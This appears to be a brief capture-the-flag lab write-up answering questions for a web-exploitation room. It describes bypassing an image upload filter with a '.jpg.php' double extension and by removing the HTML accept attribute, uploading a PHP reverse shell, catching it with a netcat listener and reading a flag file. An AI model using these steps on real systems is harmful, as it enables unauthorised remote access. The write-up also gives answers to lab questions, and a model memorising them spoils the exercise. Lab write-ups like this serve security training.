# [Web Exploit] Elf Strikes Back

IP: 10.10.117.83
ID number: ODIzODI5MTNiYmYw

### What string of text needs adding to the URL to get access to the upload page?
- `?id=ODIzODI5MTNiYmYw`

### What type of file is accepted by the site?
- image

### Bypass the filter and upload a reverse shell.
- `cd /usr/share/webshells/php/php-reverse-shell.php`
- change `$ip='<'ip a show tun0'` and `$port=443` (which is openvpn's port)
- make the file extension being `.jpg.php`.
- delete `accept` attribute in HTML

### In which directory are the uploaded files stored?
- Blindly guessed `/uploads/` (don't need `gobuster` lol)

### Activate your reverse shell and catch it in a netcat listener!
- `sudo nc -lvnp 443`
- go to `/uploads/` then activate the shell file

### What is the flag in /var/www/flag.txt?
- `cat` it :D




